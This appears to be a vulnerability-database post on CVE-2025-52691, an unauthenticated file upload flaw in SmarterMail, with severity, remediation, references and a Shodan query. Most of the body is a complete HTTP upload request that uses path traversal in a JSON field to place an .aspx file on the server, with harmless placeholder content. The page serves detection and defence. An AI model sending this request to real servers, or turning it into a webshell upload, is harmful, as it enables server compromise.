---
layout: post
cve_id: CVE-2025-52691
title: SmarterMail - Unrestricted File Upload
pcap: true
pcap_path: /pcaps/2025/CVE-2025-52691.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2025/CVE-2025-52691.yaml
snort2_rule: N/A
snort3_rule: N/A
author: DhiyaneshDK,watchTowr
severity: critical
impact: 'Unauthenticated attackers can upload arbitrary files, potentially leading
  to remote code execution and full server compromise.

  '
remediation: 'Update to the latest version of the mail server.

  '
reference:
- https://github.com/watchtowrlabs/watchTowr-vs-SmarterMail-CVE-2025-52691
- https://www.csa.gov.sg/alerts-and-advisories/alerts/al-2025-124/
metadata:
  verified: true
  max-request: 1
  shodan-query: html:"SmarterMail"
tags:
- cve
- cve2025
- smartermail
- file-upload
- intrusive
- rce
---

## üîç Vulnerability Description
Mail server contains an unrestricted file upload vulnerability allowing unauthenticated attackers to upload arbitrary files to any location, potentially enabling remote code execution.


## üåê HTTP Request
```nohighlight
POST /api/upload HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.4 Safari/605.1.15
Connection: close
Content-Length: 640
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Accept-Encoding: gzip
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="context"
attachment
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="resumableIdentifier"
fakeID
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="resumableFilename"
wwetns.aspx
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="contextData"
{"guid":"dag/../../rrqhcr"}
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="whatever"; filename="wwetns.jpg"
Detection Artifact Generator
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

